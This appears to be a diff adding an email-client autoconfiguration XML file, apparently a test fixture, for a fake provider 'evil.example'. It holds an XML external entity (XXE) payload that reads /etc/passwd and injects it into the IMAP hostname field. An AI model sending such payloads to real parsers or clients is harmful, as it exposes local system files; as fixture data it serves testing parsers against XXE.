@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE clientInfo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<clientInfo>
+  <emailProvider id="evil.example" domain="evil.example">
+    <displayName>Evil</displayName>
+    <incomingServer type="imap">
+      <hostname>&xxe;</hostname>
+      <port>993</port>
+      <socketType>SSL</socketType>
+      <username>%EMAILADDRESS%</username>
+    </incomingServer>
+    <outgoingServer type="smtp">
+      <hostname>smtp.evil.example</hostname>
+      <port>465</port>
+      <socketType>SSL</socketType>
+      <username>%EMAILADDRESS%</username>
+    </outgoingServer>
+  </emailProvider>
+</clientInfo>
